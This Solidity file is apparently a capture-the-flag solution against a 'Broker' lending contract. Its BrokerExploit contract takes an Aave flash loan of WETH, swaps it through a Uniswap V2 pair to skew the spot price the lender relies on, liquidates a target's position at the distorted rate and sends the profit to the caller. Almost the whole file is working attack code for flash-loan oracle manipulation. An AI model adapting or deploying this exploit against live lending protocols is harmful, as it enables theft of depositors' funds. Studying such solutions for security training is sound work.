// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
import "../../src/2021/03.Broker.sol";

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAaveFlashLoanReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface IERC20 {
    function approve(address _spender, uint256 _value) external returns (bool);

    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256);
}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, "ds-math-add-overflow");
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, "ds-math-sub-underflow");
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, "ds-math-mul-overflow");
    }
}

library UniswapV2Library {
    using SafeMath for uint256;

    function getAmountOut(
        uint amountIn,
        uint reserveIn,
        uint reserveOut
    ) internal pure returns (uint amountOut) {
        require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
        require(
            reserveIn > 0 && reserveOut > 0,
            "UniswapV2Library: INSUFFICIENT_LIQUIDITY"
        );
        uint amountInWithFee = amountIn.mul(997);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }
}

// @dev-notice: this contract leaves out a lot of safety/security checks because it's niched to `Broker` contract
contract BrokerExploit is IAaveFlashLoanReceiver {
    uint256 private constant WETH_BORROWED = 15.5 ether;
    IAavePool private constant _flashPool =
        IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    Broker public lendingPool;
    IUniswapV2Pair public univ2Pair;

    constructor(Broker _lendingPool, IUniswapV2Pair _pair) {
        lendingPool = _lendingPool;
        univ2Pair = _pair;
    }

    function attack(address target) public {
        _flashPool.flashLoanSimple(
            address(this),
            address(lendingPool.weth()),
            WETH_BORROWED,
            abi.encode(target, msg.sender),
            uint16(0)
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(_flashPool), "BrokerExploit: 401");

        (address target, address exploiter) = abi.decode(
            params,
            (address, address)
        );
        (uint112 _reserve0x, uint112 _reserve1x, ) = univ2Pair.getReserves();
        uint256 flashRepayment = amount + premium;

        lendingPool.weth().transfer(address(univ2Pair), amount);
        univ2Pair.swap(
            UniswapV2Library.getAmountOut(amount, _reserve1x, _reserve0x),
            0,
            address(this),
            bytes("")
        );

        {
            // scoped to avoid "Stack too deep" errors
            (uint112 _reserve0y, uint112 _reserve1y, ) = univ2Pair
                .getReserves();
            uint256 rate = _reserve0y / _reserve1y;
            uint256 liquidationAmount = rate * lendingPool.deposited(target);

            assert(liquidationAmount <= lendingPool.debt(target));

            IERC20(univ2Pair.token0()).approve(
                address(lendingPool),
                liquidationAmount
            );
            lendingPool.liquidate(target, liquidationAmount);
        }

        IERC20(asset).approve(msg.sender, flashRepayment);
        IERC20(address(lendingPool.weth())).transfer(
            exploiter,
            IERC20(address(lendingPool.weth())).balanceOf(address(this)) -
                flashRepayment
        );

        return true;
    }
}
